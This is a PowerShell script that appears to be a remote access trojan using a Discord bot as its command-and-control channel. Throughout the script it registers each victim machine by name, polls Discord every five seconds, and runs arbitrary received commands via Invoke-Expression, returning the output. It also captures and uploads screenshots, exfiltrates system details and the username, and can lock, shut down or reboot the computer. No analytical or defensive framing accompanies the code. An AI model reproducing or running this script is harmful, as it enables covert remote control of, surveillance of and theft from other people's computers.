$baseUrl = "https://discord.com/api/v10"
$hwid = $env:COMPUTERNAME
$headers = @{
    "Authorization" = "Bot $TOKEN"
    "User-Agent" = "Powershell"
    "Content-Type" = "application/json"
}

function Invoke-DiscordAPI {
    param([string]$Method, [string]$Endpoint, $Body = $null)
    $url = "$baseUrl/$Endpoint"
    if ($Body) { $Body = $Body | ConvertTo-Json -Depth 10 }
    try { Invoke-RestMethod -Method $Method -Uri $url -Headers $headers -Body $Body }
    catch { Write-Error $_.Exception.Message }
}

function Send-DiscordMessage {
    param([string]$channelID, [string]$content)
    Invoke-DiscordAPI -Method Post -Endpoint "channels/$channelID/messages" -Body @{ content = $content }
}

function Get-Screenshot {
    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $filePath = "$env:TEMP\screenshot.jpg"
    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
    $graphics.Dispose(); $bitmap.Dispose()
    return $filePath
}

Register-EngineEvent PowerShell.Exiting -Action {
    if ($whURL) { Invoke-RestMethod -Uri $whURL -Method Post -Body @{ content = "$hwid disconnected." } }
}

$channels = Invoke-DiscordAPI -Method Get -Endpoint "guilds/$serverID/channels"
$category = $channels | Where-Object { $_.type -eq 4 -and $_.name -eq $hwid } 
if (-not $category) { 
    $category = Invoke-DiscordAPI -Method Post -Endpoint "guilds/$serverID/channels" -Body @{ name = $hwid; type = 4 }
}
$mainChannel = $channels | Where-Object { $_.type -eq 0 -and $_.name -eq "main" -and $_.parent_id -eq $category.id }
if (-not $mainChannel) { 
    $mainChannel = Invoke-DiscordAPI -Method Post -Endpoint "guilds/$serverID/channels" -Body @{ name = "main"; type = 0; parent_id = $category.id }
}

$mainAllChannel = $channels | Where-Object { $_.type -eq 0 -and $_.name -eq "main-all" }

$checkinChannel = $channels | Where-Object { $_.type -eq 0 -and $_.name -eq "check-in" }
if ($checkinChannel) { Send-DiscordMessage -channelID $checkinChannel.id -content "$hwid has connected." }

while ($true) {
    $allChannels = @($mainChannel)
    if ($mainAllChannel) { $allChannels += $mainAllChannel }
    
    foreach ($channel in $allChannels) {
        $messages = Invoke-DiscordAPI -Method Get -Endpoint "channels/$($channel.id)/messages?limit=1"
        foreach ($msg in $messages | Sort-Object id) {
            if ($msg.author.id -eq (Invoke-DiscordAPI -Method Get -Endpoint "users/@me").id) { continue }
            $content = $msg.content.Trim().ToLower()
            
            if ($content -match "^>") {
                $command = $content.Substring(1).Trim()
                $response = Invoke-Expression -Command "$command 2>&1" | Out-String
                Send-DiscordMessage -channelID $channel.id -content "Results of `'$command': `n``````$response``````"
            } elseif ($content -eq "ss" -or $content -eq "screenshot") {
                $webClient = New-Object System.Net.WebClient
                $webClient.Headers.Add("Authorization", "Bot $TOKEN")
                $path = Get-Screenshot
                if ($path) {
                    $webClient.UploadFile("$baseUrl/channels/$($channel.id)/messages", "POST", $path)
                    Remove-Item -Path $path
                } else {
                    Send-DiscordMessage -channelID $channel.id -content "Failed to take screenshot."
                }
            } elseif ($content -eq "systeminfo" -or $content -eq "sysinfo") {
                $info = @{
                    "Computer Name" = $hwid
                    "OS" = (Get-CimInstance Win32_OperatingSystem).Caption
                    "Uptime" = ((Get-CimInstance Win32_OperatingSystem).LastBootUpTime | New-TimeSpan).ToString("g")
                    "CPU" = (Get-CimInstance Win32_Processor).Name
                    "RAM" = "{0} MB" -f [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1MB, 0)
                    "Username" = $env:USERNAME
                } | Out-String
                Send-DiscordMessage -channelID $channel.id -content "``````$info``````"
            } elseif ($content -eq "lock") {
                rundll32.exe user32.dll,LockWorkStation
                Send-DiscordMessage -channelID $channel.id -content "Screen locked."
            } elseif ($content -eq "shutdown" -or $content -eq "poweroff") {
                Send-DiscordMessage -channelID $channel.id -content "Shutting down..."
                Stop-Computer -Force
            } elseif ($content -eq "restart" -or $content -eq "reboot") {
                Send-DiscordMessage -channelID $channel.id -content "Restarting..."
                Restart-Computer -Force
            } elseif ($content -match '^msgbox\s+"(.*)"\s+"(.*)"$') {
                $title = $matches[1].Trim()
                $message = $matches[2].Trim()
                Add-Type -AssemblyName "System.Windows.Forms"
                $result = [System.Windows.Forms.MessageBox]::Show($message, $title)
                $response = $result.ToString()
                Send-DiscordMessage -channelID $channel.id -content "Message displayed: '$message' with title '$title'. User response: $response"
            }
        }
    }
    Start-Sleep -Seconds 5
}
